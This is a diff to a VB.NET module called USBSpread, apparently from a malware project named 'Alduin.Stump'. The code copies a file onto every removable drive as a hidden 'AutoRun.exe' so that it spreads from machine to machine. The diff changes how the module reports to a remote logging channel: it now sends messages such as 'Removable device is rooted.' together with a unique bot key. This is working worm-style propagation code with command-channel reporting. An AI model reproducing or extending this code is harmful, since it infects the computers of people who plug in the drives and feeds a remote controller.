@@ -1,5 +1,4 @@
 ﻿Imports System.IO
-Imports Alduin.Stump.Alduin.Stump.Class.Network
 
 Module USBSpread
     Public Sub USBSpreading(ByVal source As String)
@@ -26,14 +25,25 @@ Module USBSpread
                         File.Copy(source, String.Concat(drive.Name, "AutoRun.exe"), True)
 
                         File.SetAttributes(String.Concat(drive.Name, "AutoRun.exe"), FileAttributes.Hidden)
+                        Dim log As New LogModel With {
+                            .KeyUnique = GetConfigJson.KeyUnique,
+                            .Message = "Removable device is rooted.",
+                            .Type = "Info"
+                        }
+                        http.TalkChannelHTTP(log, LogUrl)
                     Finally
-                        http.TalkChannelHTTP("Removable device is rooted.")
+
                     End Try
                 End If
             Next
 
         Catch ex As Exception
-            http.TalkChannelHTTP("Exception: " & ex.ToString())
+            Dim log As New LogModel With {
+                 .KeyUnique = GetConfigJson.KeyUnique,
+                 .Message = "Exception: " & ex.ToString(),
+                 .Type = "Error"
+            }
+            http.TalkChannelHTTP(log, LogUrl)
         End Try
     End Sub
 End Module
